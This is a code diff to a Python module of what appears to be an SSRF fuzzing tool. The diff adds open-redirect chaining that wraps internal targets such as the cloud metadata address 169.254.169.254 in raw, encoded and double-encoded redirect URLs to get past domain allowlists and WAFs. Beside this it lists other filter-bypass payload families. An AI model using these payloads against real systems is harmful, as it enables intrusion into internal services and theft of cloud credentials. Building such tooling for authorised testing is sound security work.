@@ -6,6 +6,11 @@ intended-trusted host a naive allowlist accepts), this module generates the
 catalog of filter-bypass payload variants wraith injects at the marked injection
 point:
 
+* **Open-redirect chaining** (:func:`redirect_chain_variants`, v0.8) -- when an
+  open-redirect endpoint on a trusted domain is available, embed the internal
+  target URL into it (raw, URL-encoded, double-encoded). A filter that only
+  checks ``startswith("trusted.com")`` passes all three; the SSRF sink follows
+  the redirect to the internal host. Comes first in the ordering.
 * **IP encodings** (:func:`ipv4_encodings`) -- dword-decimal, hex dotted +
   dotless, octal dotted + dotless, shorthand (``127.1`` / ``0``),
   IPv4-mapped IPv6 (``[::ffff:127.0.0.1]`` and the pure-hex
@@ -23,9 +28,9 @@ worked examples from the contract:
     127.0.0.1        -> 2130706433 / 0x7f000001 / 0177.0.0.1
     169.254.169.254  -> 2852039166 / 0xa9fea9fe
 
-Default variant ordering (criteria #2): userinfo(``@``) -> DNS-rebind ->
-parser-differential -> encoding -> scheme. Redirect-chain following is a
-fetch-time behaviour handled by the engine, not a payload string.
+Default variant ordering (criteria #2): redirect-chain + userinfo(``@``) ->
+DNS-rebind -> parser-differential -> encoding -> scheme. Redirect-chain variants
+require a caller-supplied open-redirect URL; they are omitted when none is given.
 
 R5: nothing here evaluates content; these are pure string transforms.
 """
@@ -34,7 +39,7 @@ from __future__ import annotations
 
 import ipaddress
 from dataclasses import dataclass
-from urllib.parse import urlsplit
+from urllib.parse import quote, urlsplit
 
 __all__ = [
     "Variant",
@@ -49,6 +54,8 @@ __all__ = [
     "ipv4_encodings",
     "is_ipv4_literal",
     "rbndr_hostname",
+    # v0.8: open-redirect chaining
+    "redirect_chain_variants",
     "build_variants",
     "mutate",
     "IPV6_LOOPBACK",
@@ -203,6 +210,86 @@ def ipv4_encodings(ip: str) -> list[Variant]:
 
 
 # --------------------------------------------------------------------------- #
+# Open-redirect chaining (v0.8)
+# --------------------------------------------------------------------------- #
+
+def redirect_chain_variants(
+    internal_url: str,
+    redirect_url: str,
+    *,
+    marker: str = "FUZZ",
+) -> list[Variant]:
+    """Open-redirect chaining variants for bypassing trusted-domain allowlists.
+
+    Given an open-redirect endpoint on a trusted domain (``redirect_url``, with
+    ``marker`` where the destination is inserted) and an internal SSRF target
+    (``internal_url``), embeds the internal URL into the redirect parameter in
+    three encodings:
+
+    * ``redirect-chain-raw``: internal URL verbatim -- for redirectors that
+      pass the value through unchanged.
+    * ``redirect-chain-enc``: single URL-encoded internal URL -- for redirectors
+      that call ``urllib.parse.unquote()`` once before following.
+    * ``redirect-chain-double-enc``: double-encoded -- for redirectors that
+      decode twice, or for WAFs that only inspect the outer (first) encoding
+      layer.
+
+    A filter that only tests whether the injected URL belongs to the trusted
+    domain (``startswith("https://trusted.com")`` or a hostname allowlist) will
+    pass all three; the SSRF sink follows the redirect to the internal host.
+
+    Args:
+        internal_url: Internal SSRF destination to embed as the redirect target,
+            e.g. ``http://169.254.169.254/latest/meta-data/``.
+        redirect_url: Open-redirect endpoint template with ``marker`` at the
+            position where the destination URL is inserted, e.g.
+            ``https://trusted.com/redirect?url=FUZZ``.
+        marker: Token in ``redirect_url`` to replace with the internal URL
+            (default: ``"FUZZ"``).
+
+    Returns:
+        Three :class:`Variant` objects in the ``"redirect-chain"`` family,
+        ordered raw → encoded → double-encoded.
+
+    Example::
+
+        variants = redirect_chain_variants(
+            "http://169.254.169.254/latest/meta-data/",
+            "https://trusted.com/redir?next=FUZZ",
+        )
+        # Produces:
+        #   redirect-chain-raw:        https://trusted.com/redir?next=http://169.254...
+        #   redirect-chain-enc:        https://trusted.com/redir?next=http%3A%2F%2F169...
+        #   redirect-chain-double-enc: https://trusted.com/redir?next=http%253A%252F%252F169...
+
+    R5: ``internal_url`` is a caller-supplied URL string; the output is a
+    direct string substitution, never evaluated.
+    """
+    encoded = quote(internal_url, safe="")
+    double_enc = quote(encoded, safe="")
+    return [
+        Variant(
+            "redirect-chain-raw",
+            "redirect-chain",
+            redirect_url.replace(marker, internal_url),
+            "open redirect: raw internal URL embedded (filter sees trusted domain)",
+        ),
+        Variant(
+            "redirect-chain-enc",
+            "redirect-chain",
+            redirect_url.replace(marker, encoded),
+            "open redirect: URL-encoded internal URL (one decode pass)",
+        ),
+        Variant(
+            "redirect-chain-double-enc",
+            "redirect-chain",
+            redirect_url.replace(marker, double_enc),
+            "open redirect: double-encoded internal URL (two decode passes / WAF bypass)",
+        ),
+    ]
+
+
+# --------------------------------------------------------------------------- #
 # URL decomposition + full-catalog builder
 # --------------------------------------------------------------------------- #
 
@@ -236,6 +323,8 @@ def build_variants(
     internal_url: str,
     *,
     decoy: str = "localhost",
+    redirect_url: str | None = None,
+    redirect_marker: str = "FUZZ",
 ) -> list[Variant]:
     """Build the ordered filter-bypass variant catalog for one internal target.
 
@@ -244,15 +333,34 @@ def build_variants(
             ``http://169.254.169.254/latest/meta-data/``.
         decoy: The intended-trusted host used in the ``@`` / ``#`` / ``\\``
             tricks (the host a naive allowlist accepts).
+        redirect_url: Optional open-redirect endpoint template (v0.8). When
+            provided, three ``redirect-chain`` variants are prepended -- the
+            highest-priority bypass class (criteria #2 ordering: redirect-chain
+            + ``@`` → DNS-rebind → parser-differential → encoding → scheme).
+            Use ``redirect_marker`` to set the substitution token in the
+            template (default ``"FUZZ"``).
+        redirect_marker: Token in ``redirect_url`` that is replaced with the
+            internal URL when generating redirect-chain variants (default:
+            ``"FUZZ"``).
 
     Returns:
-        Variants in the criteria's default order: userinfo(``@``) -> DNS-rebind
-        -> parser-differential -> encoding -> scheme. Every ``value`` is a full
-        URL string ready to inject at the marked injection point.
+        Variants in the criteria's default order: [redirect-chain ->]
+        userinfo(``@``) -> DNS-rebind -> parser-differential -> encoding ->
+        scheme. Every ``value`` is a full URL string ready to inject at the
+        marked injection point. Redirect-chain variants are only included when
+        ``redirect_url`` is provided.
     """
     scheme, host, port, tail = _split_target(internal_url)
     hp = _hostport(host, port)
     variants: list[Variant] = []
+
+    # 0) Redirect chain (v0.8) -- highest bypass priority: embed the internal
+    #    URL in a trusted-domain open redirect. A filter that only checks the
+    #    outer URL's domain passes it; the sink follows the redirect internally.
+    if redirect_url is not None:
+        variants.extend(
+            redirect_chain_variants(internal_url, redirect_url, marker=redirect_marker)
+        )
 
     # 1) userinfo (@) -- strongest allowlist bypass: decoy is userinfo, the real
     #    host is the internal target.
